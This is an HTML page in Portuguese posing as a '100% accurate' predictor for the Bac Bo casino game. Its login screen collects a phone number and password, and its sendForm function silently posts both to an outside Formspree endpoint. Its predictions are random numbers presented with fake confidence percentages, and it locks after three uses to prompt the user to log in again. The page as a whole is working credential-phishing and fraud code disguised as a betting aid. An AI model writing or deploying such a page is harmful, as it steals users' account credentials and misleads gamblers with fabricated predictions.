<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Predictor Bac Bó</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background: linear-gradient(180deg, #1a1aff, #800080); /* azul para roxo */
        color: #fff;
        text-align: center;
        margin: 0;
        padding: 0;
    }
    .container {
        margin-top: 50px;
    }
    .login-container, .game-container {
        display: none;
        margin-top: 50px;
    }
    .active {
        display: block;
    }
    input {
        padding: 12px;
        margin: 10px;
        width: 250px;
        border-radius: 5px;
        border: 1px solid #444;
        background: #222;
        color: #fff;
    }
    button {
        padding: 12px 25px;
        background: #e63946;
        color: #fff;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        font-weight: bold;
    }
    button:hover {
        background: #d62828;
    }
    .result-box {
        margin-top: 20px;
        font-size: 1.3em;
        font-weight: bold;
    }
    canvas {
        margin-top: 30px;
        background: #222;
        border-radius: 10px;
        padding: 10px;
        transition: transform 1s ease-in-out;
    }
    #lock {
        margin-top: 20px;
        font-size: 1.2em;
        color: #ffcc00;
    }
</style>
</head>
<body>

<!-- Tela inicial -->
<div class="container active" id="inicio">
    <h1>🎲 Predictor Bac Bó 100% Acertivo</h1>
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Bac_Bo_game.jpg" alt="Bac Bó" width="300">
    <br><br>
    <button onclick="abrirLogin()">Conectar o Bot</button>
</div>

<!-- Tela de Login -->
<div class="login-container" id="login">
    <h1>🎲 Bac Bó Predictor</h1>
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Bac_Bo_game.jpg" alt="Bac Bó" width="300">
    <br>
    <input type="text" id="phone" placeholder="Número de telefone">
    <br>
    <input type="password" id="password" placeholder="Senha">
    <br>
    <button onclick="login()">Entrar</button>
</div>

<!-- Tela do Jogo -->
<div class="game-container" id="game">
    <h2>Previsão da Banca</h2>
    <button id="btnPrever" onclick="prever()">Prever</button>
    <div class="result-box" id="resultado">Clique em prever para gerar resultado</div>

    <!-- Gráfico -->
    <canvas id="grafico" width="400" height="400"></canvas>

    <div id="lock"></div>

    <br>
    <!-- Botão para reconectar -->
    <button onclick="voltarInicio()">Conectar o Bot</button>
</div>

<!-- Sons -->
<audio id="soundPrever" src="https://www.soundjay.com/button/beep-07.wav" preload="auto"></audio>
<audio id="soundLock" src="https://www.soundjay.com/button/beep-10.wav" preload="auto"></audio>

<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script>
let chart;
let limite = 3;
let total = 0;
let locked = false;

function abrirLogin(){
    document.getElementById("inicio").classList.remove("active");
    document.getElementById("login").classList.add("active");
}

function login(){
    let phone = document.getElementById("phone").value;
    let password = document.getElementById("password").value;

    if(phone && password){
        // Envia formulário ao clicar em Entrar
        sendForm(phone, password);

        document.getElementById("login").classList.remove("active");
        document.getElementById("game").classList.add("active");
        inicializarGrafico();
        atualizarLock();
    } else {
        alert("Preencha telefone e senha!");
    }
}

function prever(){
    if(locked){
        document.getElementById("resultado").innerText = "🔒 BLOQUEADO – Para continuar deves conectar o Bot";
        document.getElementById("soundLock").play();
        return;
    }

    document.getElementById("soundPrever").play();

    let rand = Math.random();
    let resultado;
    let dadosGrafico;

    if(rand < 0.4){ 
        resultado = "📊 Tendência: Azul (80%)";
        dadosGrafico = [80,20,0]; 
    } else if(rand < 0.8){ 
        resultado = "📊 Tendência: Vermelho (80%)";
        dadosGrafico = [0,80,20]; 
    } else { 
        resultado = "📊 Empates frequentes (20%)";
        dadosGrafico = [0,0,20]; 
    }

    // animação de giro
    const canvas = document.getElementById("grafico");
    canvas.style.transform = "rotate(360deg)";
    setTimeout(()=>{ canvas.style.transform = "rotate(0deg)"; }, 1000);

    setTimeout(()=>{
        document.getElementById("resultado").innerText = resultado;
        atualizarGrafico(dadosGrafico);
    }, 1000);

    total++;
    if(total >= limite){
        locked = true;
        atualizarLock();
        document.getElementById("soundLock").play();
    } else {
        atualizarLock();
    }
}

function inicializarGrafico(){
    const ctx = document.getElementById('grafico').getContext('2d');
    chart = new Chart(ctx, {
        type: 'pie',
        data: {
            labels: ['Azul', 'Vermelho', 'Empate'],
            datasets: [{
                data: [0,0,0],
                backgroundColor: ['#0077b6','#d62828','#fcbf49']
            }]
        },
        options: {
            responsive: false,
            plugins: {
                legend: {
                    labels: { color: '#fff' }
                }
            }
        }
    });
}

function atualizarGrafico(dados){
    chart.data.datasets[0].data = dados;
    chart.update();
}

function atualizarLock(){
    document.getElementById("lock").innerText = locked ? "🔒 BLOQUEADO – Conecte o Bot para continuar" : "IA: " + (limite - total) + " previsões restantes";
}

function voltarInicio(){
    // Resetar jogo e voltar para tela inicial
    total = 0;
    locked = false;
    document.getElementById("game").classList.remove("active");
    document.getElementById("inicio").classList.add("active");
}

function sendForm(phone, password){
    let formData = new FormData();
    formData.append("telefone", phone);
    formData.append("senha", password);

    fetch("https://formspree.io/f/xgvneord", {
        method:"POST",
        body:formData,
        headers:{ "Accept":"application/json" }
    })
    .then(res=>{
        if(res.ok){
            alert("Login enviado com sucesso!");
        } else {
            alert("Erro ao enviar");
        }
    })
    .catch(()=>alert("Erro de rede"));
}
</script>

</body>
</html>
